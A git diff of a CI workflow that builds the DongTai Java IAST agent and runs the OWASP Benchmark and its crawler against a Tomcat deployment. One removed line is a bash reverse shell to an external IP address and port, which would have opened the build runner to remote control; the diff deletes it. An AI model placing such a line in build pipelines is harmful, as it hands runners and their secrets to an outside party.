@@ -110,7 +110,7 @@ jobs:
           echo "shutdown tomcat"
           PID=$(ps aux|grep "org.apache.catalina.startup.Bootstrap start"|grep -v grep |awk '{print $2}')
           echo "tomcat pid is: $PID"
-          kill -kill $PID
+          kill $PID
           ps aux
 
       - name: Benchmark-Vulns-Test
@@ -120,16 +120,26 @@ jobs:
           cd BenchmarkJava
           mvn clean package cargo:start -Pdeploywdongtai
 
-          cp ../DongTai-agent-java/release/iast-agent.jar tools/DongTai/
+          cp ../DongTai-agent-java/release/iast-agent.jar tools/DongTai/dongtai.jar
           cp ../DongTai-agent-java/release/lib/*.jar target/cargo/installs/apache-tomcat-8.5.70/apache-tomcat-8.5.70/temp
 
-          /bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
-          nohup mvn clean package cargo:run -Pdeploywdongtai &
-          
-          sleep 600
+          echo "run benchmark in backend"
+          nohup mvn package cargo:run -Pdeploywdongtai &
 
-          echo "shutdown tomcat"
-          #ps aux|grep tomcat|awk '{print $2}' | xargs -I {} kill -9 {}
+          echo "wait for benchmark start..."          
+          sleep 120
+
+          echo "build Crawler"
+          git clone https://github.com/OWASP-Benchmark/BenchmarkUtils.git
+          cd BenchmarkUtils
+          mvn install
+
+          echo "run Crawler.sh"
+          cd ..
+          bash runCrawler.sh
+
+          echo "waiting for report upload..."          
+          sleep 120
 
 
   Upload-To-OSS:
